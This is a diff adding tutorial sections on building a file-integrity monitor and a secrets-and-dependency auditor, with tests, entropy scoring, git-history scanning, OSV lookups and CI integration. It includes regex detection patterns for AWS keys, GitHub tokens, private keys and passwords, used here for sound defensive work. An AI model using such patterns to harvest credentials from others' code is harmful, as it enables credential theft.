+- **Real-time only.** Missed notifications mean missed changes. Keep a scheduled full scan.
+@keys
+- OS file notifications (via watchdog) give real-time detection.
+- Debounce bursts; re-hash and compare before alerting.
+- Reports grouped by severity, in text and JSON.
+- A periodic full scan backs up the event stream.
+
+=== S2.4
+@idea
+Polish the monitor the same way as the first project, with a few specifics. Its tests touch the file system, so they rely on **`tmp_path`**: each test builds a small tree of files, takes a baseline, changes something and asserts the exact report. Cover each change type (content, mode, added, deleted), the exclusions, unreadable files, and the baseline signature. Tests that depend on secrets or environment use **`monkeypatch`** to set variables (the HMAC key, the config path) without touching the real environment.
+
+Permission and owner behaviour differs between operating systems (Windows has no Unix modes), so mark such tests with `skipif(sys.platform == "win32")` and run CI on Linux and macOS, or on Windows too with those skips. A test that runs the command-line entry point end to end (`main(["scan", ...])` returning an exit code, 0 for no changes and 1 for changes, so it can be used in scripts) proves the pieces work together.
+
+The README explains the threat model honestly, shows a real report, and documents how to run it on a schedule (a cron line or systemd timer) and in real-time mode. CV bullets again name techniques and results: chunked SHA-256 hashing, HMAC-signed baselines, debounced real-time events, cross-platform tests.
+@how
+- `tmp_path` trees per test; one test per change type and edge case.
+- `monkeypatch.setenv("FIM_KEY", ...)` for secrets; never real keys in tests.
+- `pytest.mark.skipif(sys.platform == "win32", reason="no Unix modes")` where needed.
+- Exit codes: 0 unchanged, 1 changes found, 2 errors; test `main(argv)` end to end.
+- README: threat model, real report, cron/systemd example, CV bullets.
+@example python: Filesystem tests with tmp_path and monkeypatch
+import contextlib, io, re
+import pytest
+from pathlib import Path
+
+Path("test_fim.py").write_text('''
+import hashlib, hmac, json, os, stat, sys
+import pytest
+
+def scan(root):
+    return {p.relative_to(root).as_posix(): {"sha256": hashlib.sha256(p.read_bytes()).hexdigest(),
+                                             "mode": stat.filemode(p.stat().st_mode)}
+            for p in sorted(root.rglob("*")) if p.is_file()}
+
+def diff(old, new):
+    out = sorted(f"added {p}" for p in new.keys() - old.keys()) + sorted(f"deleted {p}" for p in old.keys() - new.keys())
+    out += sorted(f"{f} {p}" for p in old.keys() & new.keys() for f in ("sha256", "mode") if old[p][f] != new[p][f])
+    return out
+
+def sign(data):
+    return hmac.new(os.environ["FIM_KEY"].encode(), json.dumps(data, sort_keys=True).encode(), "sha256").hexdigest()
+
+@pytest.fixture
+def tree(tmp_path):
+    (tmp_path / "etc").mkdir()
+    (tmp_path / "etc" / "sshd_config").write_text("PermitRootLogin no\\n")
+    return tmp_path
+
+def test_unchanged_tree_reports_nothing(tree):
+    assert diff(scan(tree), scan(tree)) == []
+
+def test_content_change(tree):
+    before = scan(tree)
+    (tree / "etc" / "sshd_config").write_text("PermitRootLogin yes\\n")
+    assert diff(before, scan(tree)) == ["sha256 etc/sshd_config"]
+
+def test_added_and_deleted(tree):
+    before = scan(tree)
+    (tree / "etc" / "sshd_config").unlink()
+    (tree / "x.sh").write_text("evil")
+    assert diff(before, scan(tree)) == ["added x.sh", "deleted etc/sshd_config"]
+
+@pytest.mark.skipif(sys.platform == "win32", reason="no Unix permission bits")
+def test_mode_change(tree):
+    before = scan(tree)
+    (tree / "etc" / "sshd_config").chmod(0o666)
+    assert diff(before, scan(tree)) == ["mode etc/sshd_config"]
+
+def test_signature_detects_tampering(tree, monkeypatch):
+    monkeypatch.setenv("FIM_KEY", "test-only-key")
+    baseline = scan(tree)
+    signature = sign(baseline)
+    baseline["etc/sshd_config"]["sha256"] = "0" * 64
+    assert not hmac.compare_digest(sign(baseline), signature)
+''')
+out = io.StringIO()
+with contextlib.redirect_stdout(out):
+    pytest.main(["-v", "-p", "no:cacheprovider", "test_fim.py"])
+for line in out.getvalue().splitlines():
+    if "PASSED" in line or "FAILED" in line or "SKIPPED" in line:
+        print(re.sub(r"\s+\[\s*\d+%\]", "", line).replace("test_fim.py::", ""))
+@note
+Every test builds its own small tree in a temporary folder, so they never touch real files or each other. The signing key comes from `monkeypatch`, which removes it after the test. The mode test is skipped automatically on Windows, where Unix permission bits do not exist.
+@example text: Running it on a schedule, from the README
+## Scheduled scans
+
+Scan every hour and email a report only when something changed
+(exit code 1 = changes, 0 = none, 2 = error):
+
+    # crontab -e
+    17 * * * *  fim scan --policy /etc/fim/policy.toml --report /var/log/fim/latest.txt \
+                || mail -s "FIM: changes on $(hostname)" you@example.com < /var/log/fim/latest.txt
+
+Or as a systemd timer:
+
+    # /etc/systemd/system/fim.timer
+    [Timer]
+    OnCalendar=hourly
+    RandomizedDelaySec=10m
+    Persistent=true
+
+## Real-time mode
+
+    fim watch --policy /etc/fim/policy.toml     # inotify via watchdog, debounced
+
+## What it does not protect against
+- An attacker with root on this host can stop the monitor; keep the
+  signing key and reports on another machine.
+@note
+Meaningful exit codes make the tool composable: cron only sends mail when the scan reports changes. The README covers both scheduled and real-time modes and ends with the honest limitation that matters most for a security tool.
+@mistakes
+- **Tests that write to real system paths.** Use `tmp_path`.
+- **Real secrets in tests.** Use `monkeypatch` with test-only values.
+- **Assuming Unix permissions everywhere.** Skip those tests on Windows, explicitly.
+@keys
+- Filesystem tests with `tmp_path`; secrets via `monkeypatch`.
+- Skip platform-specific tests explicitly; run CI on several systems.
+- Meaningful exit codes make the tool scriptable.
+- README with threat model, real report and scheduling examples.
+
+=== S3.1
+@idea
+The third security project is a **secrets and dependency auditor**: it scans code for leaked credentials (API keys, tokens, private keys, passwords in config) and checks dependencies for known vulnerabilities. Leaked secrets are one of the most common causes of real breaches, because once pushed to a public repository they are harvested by bots within minutes.
+
+There are two complementary detection techniques. **Pattern matching** finds credentials with a known format: AWS access keys start with `AKIA` followed by 16 uppercase letters or digits, GitHub tokens with `ghp_`, Slack tokens with `xox`, private keys with `-----BEGIN ... PRIVATE KEY-----`. Patterns are precise but only find what you anticipated. **Entropy** finds unknown formats: a randomly generated secret looks random, so its characters are spread evenly and its **Shannon entropy** (bits of information per character) is high, around 4–6 for base64-like strings versus 2–3.5 for English words and code.
+
+The hard part is keeping **false positives** low, because a tool that cries wolf gets switched off. Combine signals: require high entropy *and* a suspicious context (a variable named like `key`, `token`, `secret` or `password`), skip test fixtures and lock files, ignore obvious placeholders (`changeme`, `xxxx`, `<your-key>`), and always **mask** secrets in reports.
+@how
+- Known formats: compiled regexes per provider (AWS, GitHub, Slack, Stripe, private key headers).
+- Entropy: `-sum(p * log2(p))` over character frequencies; flag tokens ≥ 20 characters with entropy above ~4.0.
+- Context: an assignment to a name containing key/token/secret/password raises confidence.
+- Skip placeholders and known non-secret files; allow inline ignores.
+- Mask findings: show the first 4 characters and the length only.
+@example python: Shannon entropy separates random secrets from ordinary text
+import math
+from collections import Counter
+
+def entropy(s):
+    counts = Counter(s)
+    return max(0.0, -sum(n / len(s) * math.log2(n / len(s)) for n in counts.values()))
+
+samples = {
+    "english word": "configuration",
+    "repeated": "aaaaaaaaaaaaaaaaaaaa",
+    "placeholder": "your-api-key-goes-here",
+    "uuid": "3f2504e0-4f89-11d3-9a0c-0305e82c3301",
+    "base64 secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
+    "hex token": "9b1f3c7e2a4d8f60b5e1c9a7d3f2e8b4",
+}
+for label, s in samples.items():
+    e = entropy(s)
+    print(f"{label:14} {e:4.2f} bits/char  {'SUSPICIOUS' if e >= 4.0 and len(s) >= 20 else ''}")
+@note
+Random-looking strings have high entropy because their characters are spread evenly; words, placeholders and repetitive strings score lower. The UUID sits in between: hex alphabets have at most 4 bits per character, so thresholds should depend on the character set in a real tool, one reason entropy is combined with context.
+@example python: Patterns plus context, with masking and placeholders
+import re
+
+RULES = {
+    "aws-access-key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
+    "github-token": re.compile(r"\bghp_[A-Za-z0-9]{36}\b"),
+    "private-key": re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"),
+    "assigned-secret": re.compile(r"(?i)\b\w*(?:secret|token|passw(?:or)?d|api_?key)\w*\s*[:=]\s*['\"]([^'\"]{8,})['\"]"),
+}
+PLACEHOLDERS = re.compile(r"(?i)^(changeme|x+|\*+|<.*>|your[-_].*|example.*|dummy.*)$")
+
+def mask(s):
+    return f"{s[:4]}…({len(s)} chars)"
+
+def scan(filename, text):
+    for lineno, line in enumerate(text.splitlines(), 1):
+        if "audit: ignore" in line:
+            continue
+        for rule, pattern in RULES.items():
+            for m in pattern.finditer(line):
+                value = m.group(1) if m.groups() else m.group(0)
+                if PLACEHOLDERS.match(value):
+                    continue
+                yield f"{filename}:{lineno} {rule}: {mask(value)}"
+
+code = '''AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+db_password = "hunter2-but-longer"
+api_key = "<your-api-key>"
+token = "changeme"
+GITHUB = "ghp_''' + "a1B2" * 9 + '''"
+test_secret = "fixture-value-123"  # audit: ignore
+greeting = "hello world, nothing to see"
+'''
+for finding in scan("settings.py", code):
+    print(finding)
+@note
+Known formats (AWS, GitHub) are caught by their shape, and the context rule catches a password assigned to a suspicious name. Placeholders and the explicitly ignored test fixture produced nothing, and every finding is masked so the report itself does not leak the secret.
+@mistakes
+- **Printing full secrets in reports.** The report becomes a leak. Mask them.
+- **Entropy alone.** Hashes, UUIDs and minified code flood the results. Combine with context and patterns.
+- **No way to silence accepted findings.** Teams disable the tool instead. Support ignores.
+@keys
+- Patterns catch known credential formats; entropy catches unknown random-looking secrets.
+- Combine signals with context to keep false positives low.
+- Skip placeholders, support explicit ignores.
+- Always mask secrets in output.
+
+=== S3.2
+@idea
+Scanning the working tree is not enough: a secret that was committed and later deleted is still in the **git history**, and anyone who clones the repository can find it. The auditor therefore scans both the current files and every commit.
+
+For the working tree, walk the repository with `git ls-files` (so ignored files and `.git` itself are skipped) and scan each text file, skipping binaries and large generated files. For history, `git log -p` (or `git log --all -p` for every branch) produces every change as a **unified diff**; only lines starting with `+` were added in that commit, so only they need scanning. Each hunk header (`@@ -10,0 +11,2 @@`) gives the line number in the new file, so findings can point at the exact commit, file and line.
+
+Teams need a way to accept known findings (a test key, a revoked credential) without being nagged forever. A **baseline/allowlist file** records findings by a stable **fingerprint** (a hash of rule, file and the secret itself, never the secret in clear) with a reason and an expiry date. Later scans report only new findings. Remember the remedy when a real secret is found in history: **rotate it first**; rewriting history (with `git filter-repo`) only reduces exposure, it cannot un-leak a pushed secret.
+@how
+- Working tree: `git ls-files -z`; skip binary files (a NUL byte in the first 8 KB).
+- History: `git log --all -p --no-color --format="commit %H"`; scan only `+` lines.
+- Track the current commit, file (`+++ b/...`) and line from hunk headers.
+- Fingerprint = `sha256(rule + path + secret)`; allowlist entries with reason and expiry.
+- On a real leak: rotate the credential, then consider cleaning history.
+@example python: Scanning every commit of a real repository
+import os
+import re
+import subprocess
+from pathlib import Path
+
+repo = Path("demo-repo")
+repo.mkdir(exist_ok=True)
+env = {**os.environ, "GIT_AUTHOR_NAME": "Ada", "GIT_AUTHOR_EMAIL": "ada@example.com",
+       "GIT_COMMITTER_NAME": "Ada", "GIT_COMMITTER_EMAIL": "ada@example.com",
+       "GIT_AUTHOR_DATE": "2026-11-20T10:00:00+00:00", "GIT_COMMITTER_DATE": "2026-11-20T10:00:00+00:00"}
+def git(*args):
+    return subprocess.run(["git", *args], cwd=repo, env=env, capture_output=True, text=True, check=True).stdout
+
+git("init", "-q", "-b", "main")
+(repo / "app.py").write_text('print("hello")\n')
+git("add", "."); git("commit", "-qm", "First commit")
+(repo / "settings.py").write_text('DEBUG = False\nAWS_KEY = "AKIAQWERTYUIOPASDFGH"\n')
+git("add", "."); git("commit", "-qm", "Add settings")
+(repo / "settings.py").write_text("DEBUG = False\nimport os\nAWS_KEY = os.environ['AWS_KEY']\n")
+git("add", "."); git("commit", "-qm", "Read key from environment")
+
+AWS = re.compile(r"AKIA[0-9A-Z]{16}")
+HUNK = re.compile(r"^@@ -\d+(?:,\d+)? \+(\d+)")
+commit = path = None
+line_no = 0
+messages = dict(line.split(" ", 1) for line in git("log", "--format=%h %s").splitlines())
+for line in git("log", "--all", "-p", "--no-color", "--format=commit %h").splitlines():
+    if line.startswith("commit "):
+        commit = line.split()[1]
+    elif line.startswith("+++ "):
+        path = line[6:]
+    elif m := HUNK.match(line):
+        line_no = int(m[1]) - 1
+    elif line.startswith("+"):
+        line_no += 1
+        if found := AWS.search(line):
+            print(f"commit {commit} ({messages[commit]!r}) {path}:{line_no} aws-key {found[0][:4]}…")
+    elif not line.startswith("-"):
+        line_no += 1
+
+print("current files clean:", not AWS.search((repo / "settings.py").read_text()))
+@note
+The key was removed in the latest commit, so the working tree looks clean, yet the history scan found it in the commit that added it, with the file and line. That is exactly why the auditor must read history, and why a leaked key must be rotated rather than just deleted.
+@example python: Fingerprints and an allowlist with expiry
+import hashlib
+from datetime import date
+
+def fingerprint(rule, path, secret):
+    return hashlib.sha256(f"{rule}:{path}:{secret}".encode()).hexdigest()[:16]
+
+findings = [
+    ("aws-access-key", "tests/fixtures/fake_aws.py", "AKIAIOSFODNN7EXAMPLE"),
+    ("assigned-secret", "config/dev.toml", "dev-only-password-1"),
+    ("github-token", "scripts/deploy.sh", "ghp_" + "Z9" * 18),
+]
+allowlist = {
+    fingerprint(*findings[0]): {"reason": "AWS documentation example key", "expires": date(2027, 6, 1)},
+    fingerprint(*findings[1]): {"reason": "local dev only", "expires": date(2026, 10, 1)},
+}
+
+today = date(2026, 11, 20)
+for rule, path, secret in findings:
+    fp = fingerprint(rule, path, secret)
+    entry = allowlist.get(fp)
+    if entry and entry["expires"] >= today:
+        status = f"accepted ({entry['reason']}, until {entry['expires']})"
+    elif entry:
+        status = f"REPORTED: allowlist entry expired {entry['expires']}"
+    else:
+        status = "REPORTED: new finding"
+    print(f"{fp}  {path:28} {status}")
+@note
+Findings are identified by a fingerprint, so the allowlist never stores the secret itself. The documented example key is accepted; the dev password's acceptance has expired, so it is reported again and someone must look; the new GitHub token is reported. Expiry dates stop "temporary" exceptions from becoming permanent.
+@mistakes
+- **Scanning only the current files.** Deleted secrets remain in history. Scan every commit.
+- **Allowlists that store the secret or never expire.** Use fingerprints and expiry dates.
+- **Rewriting history instead of rotating.** Once pushed, assume it was copied. Rotate first.
+@keys
+- Scan the working tree with `git ls-files` and history with `git log -p`.
+- Only added lines matter; hunk headers give line numbers.
+- Fingerprinted allowlist entries with reasons and expiry.
+- A leaked secret must be rotated, whatever happens to history.
+
+=== S3.3
+@idea
+Your code is only part of your application: most of what runs is **dependencies**, and they have vulnerabilities too. The second half of the auditor reads the project's dependencies and checks them against **OSV** (osv.dev), Google's open vulnerability database, which aggregates advisories for PyPI and other ecosystems and offers a free JSON API.
+
+Reading dependencies has a subtlety: what you declared is not what you run. `pyproject.toml` lists **ranges** (`requests>=2.28`), which say nothing about the exact version installed. A lock file (`uv.lock`, `poetry.lock`) or `pip freeze` output lists **pinned** versions, and only those can be checked precisely; transitive dependencies (the dependencies of your dependencies) appear only there. Normalise package names as PyPI does (lower case, runs of `-`, `_` and `.` become `-`), so `Jinja2`, `jinja2` and `python_dateutil`/`python-dateutil` match.
+
+The OSV API takes a package name, ecosystem and version and returns matching vulnerabilities with IDs (GHSA-..., PYSEC-..., CVE aliases), a summary, severity and the versions that fix them. `/v1/querybatch` checks many packages in one request. Report each finding with the fixed version, so the action is obvious: "upgrade jinja2 to 3.1.4". Cache responses and handle network failures, because CI should not break when the API is briefly unreachable.
+@how
+- Read pins from a lock file or `pip freeze`; ranges from `pyproject.toml` only for information.
+- Normalise names: `re.sub(r"[-_.]+", "-", name).lower()`.
+- POST to `https://api.osv.dev/v1/query` with `{"package": {"name": n, "ecosystem": "PyPI"}, "version": v}`; or `/v1/querybatch`.
+- Extract ID, aliases, summary and fixed versions from `affected[].ranges[].events`.
+- Report "upgrade X to Y"; cache results; treat API errors as warnings, not crashes.
+@example python: Reading pins and normalising names
+import re
+import tomllib
+
+PYPROJECT = """
+[project]
+name = "demo"
+dependencies = ["Requests>=2.28", "python_dateutil>=2.8", "Jinja2[i18n]~=3.1"]
+"""
+FREEZE = """certifi==2026.10.23
+Jinja2==3.1.2
+MarkupSafe==2.1.3
+python-dateutil==2.9.0.post0
+Requests==2.31.0
+six==1.16.0
+"""
+
+def normalise(name):
+    return re.sub(r"[-_.]+", "-", name).lower()
+
+declared = {}
+for spec in tomllib.loads(PYPROJECT)["project"]["dependencies"]:
+    m = re.match(r"([A-Za-z0-9._-]+)(\[[^\]]*\])?\s*(.*)", spec)
+    declared[normalise(m[1])] = m[3]
+
+pinned = {normalise(n): v for n, v in (line.split("==") for line in FREEZE.split())}
+for name, version in sorted(pinned.items()):
+    note = f"declared {declared[name]}" if name in declared else "transitive"
+    print(f"{name:16} {version:14} ({note})")
+@note
+After normalisation, `Requests`/`requests` and `python_dateutil`/`python-dateutil` match. The declared ranges say what is allowed, but only the pinned versions can be checked against advisories, and three of the six installed packages are transitive: they appear nowhere in `pyproject.toml`.
+@example python: Querying an OSV-style API, with a cache and a fallback
+import json
+import threading
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+import requests
+
+ADVISORIES = {("jinja2", "3.1.2"): [{
+    "id": "GHSA-h5c8-rqwp-cp95", "aliases": ["CVE-2024-22195"],
+    "summary": "Jinja vulnerable to HTML attribute injection when using xmlattr filter",
+    "affected": [{"ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.1.3"}]}]}],
+}]}
+
+class FakeOSV(BaseHTTPRequestHandler):                 # stands in for https://api.osv.dev
+    def do_POST(self):
+        q = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
+        vulns = ADVISORIES.get((q["package"]["name"], q["version"]), [])
+        self.send_response(200); self.end_headers()
+        self.wfile.write(json.dumps({"vulns": vulns} if vulns else {}).encode())
+    def log_message(self, *a):
+        pass
+
+server = ThreadingHTTPServer(("127.0.0.1", 0), FakeOSV)
+threading.Thread(target=server.serve_forever, daemon=True).start()
+API = f"http://127.0.0.1:{server.server_address[1]}/v1/query"
+cache = {}
+
+def check(name, version, api=API):
+    if (name, version) in cache:
+        return cache[(name, version)]
+    try:
+        r = requests.post(api, json={"package": {"name": name, "ecosystem": "PyPI"}, "version": version}, timeout=5)
+        r.raise_for_status()
+    except requests.RequestException as error:
+        return f"WARNING: could not check ({type(error).__name__})"
+    findings = []
+    for v in r.json().get("vulns", []):
+        fixed = [e["fixed"] for a in v["affected"] for rg in a["ranges"] for e in rg["events"] if "fixed" in e]
+        findings.append(f"{v['id']} ({', '.join(v['aliases'])}): {v['summary']} -> upgrade to {fixed[0]}")
+    cache[(name, version)] = findings
+    return findings
+
+for name, version in [("jinja2", "3.1.2"), ("requests", "2.31.0")]:
+    print(name, version, check(name, version) or "no known vulnerabilities")
+print("six 1.16.0 with the API down:", check("six", "1.16.0", api="http://127.0.0.1:9/v1/query"))
+server.shutdown()
+@note
+A local server returns OSV-shaped responses so the example runs offline; the real tool posts the same JSON to `api.osv.dev`. Each finding names the advisory, its CVE alias and, most usefully, the version to upgrade to. When the API is unreachable, the result is a warning rather than a crash, and successful answers are cached.
+@mistakes
+- **Checking declared ranges instead of installed versions.** Ranges cannot be matched to advisories. Use the lock file.
+- **Ignoring transitive dependencies.** Most vulnerable packages are not ones you chose directly.
+- **Breaking CI whenever the vulnerability API hiccups.** Warn and retry; cache results.
+@keys
+- Check pinned versions from a lock file, including transitive dependencies.
+- Normalise package names as PyPI does.
+- Query OSV (single or batch) and report the fixed version.
+- Cache responses and degrade gracefully on network errors.
+
+=== S3.4
+@idea
+A security tool only helps if people run it, so the last step is making adoption effortless. The two standard integration points are a **pre-commit hook**, which runs on the developer's machine before each commit and stops a secret before it ever enters history, and a **CI step**, which runs on every push and pull request as a safety net for anyone who skipped the hook.
+
+For pre-commit, publish a `.pre-commit-hooks.yaml` in your repository describing the hook (id, entry command, which files it receives); users then add your repository and hook id to their own `.pre-commit-config.yaml`. In pre-commit mode the tool should scan only the **staged files** it is given, and be fast, or people will bypass it with `--no-verify`.
+
+**Exit codes** carry the result to both: 0 means clean, and non-zero means findings, ideally with distinct bits (1 for secrets, 2 for vulnerable dependencies, 3 for both) so pipelines can treat them differently. Offer **machine-readable output** too: JSON for scripts, and **SARIF**, the standard format that GitHub code scanning displays as annotations on the pull request's diff. Package it so `pipx install` or `uvx` runs it in one command, and document all three ways to use it in the README.
+@how
+- `.pre-commit-hooks.yaml`: `id`, `name`, `entry`, `language: python`, `types: [text]`.
+- Pre-commit mode: scan only the file paths passed as arguments; keep it under a second.
+- Exit code bit flags: 1 secrets, 2 dependencies; 0 clean; distinct code for tool errors.
+- `--format text|json|sarif`; upload SARIF with `github/codeql-action/upload-sarif`.
+- Publish to PyPI; document pre-commit, CI and one-off use.
+@example python: Exit codes as bit flags, and JSON output for machines
+import json
+import sys
+
+EXIT_SECRETS, EXIT_DEPS, EXIT_ERROR = 1, 2, 4
+
+def run(findings, fmt="text", out=sys.stdout):
+    code = 0
+    if any(f["kind"] == "secret" for f in findings):
+        code |= EXIT_SECRETS
+    if any(f["kind"] == "dependency" for f in findings):
+        code |= EXIT_DEPS
+    if fmt == "json":
+        print(json.dumps({"findings": findings, "exit_code": code}, indent=1, ensure_ascii=False), file=out)
+    else:
+        for f in findings:
+            print(f"{f['file']}:{f.get('line', '-')}: {f['rule']} {f['message']}", file=out)
+    return code
+
+secret = {"kind": "secret", "rule": "aws-access-key", "file": "settings.py", "line": 2, "message": "AKIA…(20 chars)"}
+dep = {"kind": "dependency", "rule": "GHSA-h5c8-rqwp-cp95", "file": "uv.lock", "message": "jinja2 3.1.2 -> upgrade to 3.1.3"}
+
+for label, findings in [("clean", []), ("secret only", [secret]), ("dependency only", [dep]), ("both", [secret, dep])]:
+    import io
+    code = run(findings, out=io.StringIO())
+    print(f"{label:16} exit {code}  secrets={bool(code & EXIT_SECRETS)} deps={bool(code & EXIT_DEPS)}")
+run([secret, dep], fmt="json")
+@note
+Each kind of problem sets its own bit, so one number tells a pipeline everything: 3 means both, and a script can block merges on secrets while only warning on dependencies by testing the bits. The JSON form carries the same information for other tools.
+@example text: Adopting the auditor in three ways
+# 1. In your repository: .pre-commit-config.yaml
+repos:
+  - repo: https://github.com/you/secret-audit
+    rev: v1.2.0
+    hooks:
+      - id: secret-audit            # scans only staged files, < 1 s
+
+# The hook definition published in the tool's own repo: .pre-commit-hooks.yaml
+- id: secret-audit
+  name: secret-audit
+  entry: secret-audit scan --staged
+  language: python
+  types: [text]
+
+# 2. In CI: .github/workflows/audit.yml (excerpt)
+      - run: pipx run secret-audit scan --history --deps --format sarif > audit.sarif
+      - uses: github/codeql-action/upload-sarif@v3
+        if: always()
+        with:
+          sarif_file: audit.sarif
+
+# 3. One-off, anywhere:
+#    uvx secret-audit scan --history .
+@note
+The pre-commit hook stops secrets on the developer's machine, before they reach history; CI catches whatever slips through and uploads SARIF so findings appear as annotations on the pull request; and the one-off command lets anyone try it without installing anything permanently.
+@mistakes
+- **A slow pre-commit hook.** Developers bypass it. Scan only staged files.
+- **One exit code for everything.** Pipelines cannot tell secrets from outdated packages. Use distinct bits.
+- **Text-only output.** Tools and dashboards cannot consume it. Offer JSON and SARIF.
+@keys
+- Pre-commit stops secrets before they enter history; CI is the safety net.
+- Scan only staged files in hooks, and keep them fast.
+- Exit code bits and JSON/SARIF output make results machine-readable.
+- Publish so it runs with one command; document every way to adopt it.
